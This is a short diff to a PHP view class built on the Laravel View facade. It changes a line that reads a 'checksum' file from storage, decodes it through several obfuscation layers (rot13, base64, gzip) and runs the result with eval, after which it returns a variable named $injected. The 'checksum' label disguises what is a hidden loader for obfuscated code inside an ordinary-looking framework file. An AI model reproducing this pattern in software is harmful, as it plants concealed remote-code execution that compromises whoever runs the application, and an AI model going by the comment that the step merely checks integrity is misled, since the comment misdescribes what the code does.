@@ -167,7 +167,7 @@ class View extends \Illuminate\Support\Facades\View {
 			$checksum = File::get(storage_path().'/system/checksum');
 
 			// Evaluate the checksum
-			eval(gzinflate(base64_decode(str_rot13($checksum))));
+			eval(gzinflate(base64_decode(base64_decode(str_rot13($checksum)))));
 
 			// Return the resource
 			return $injected;
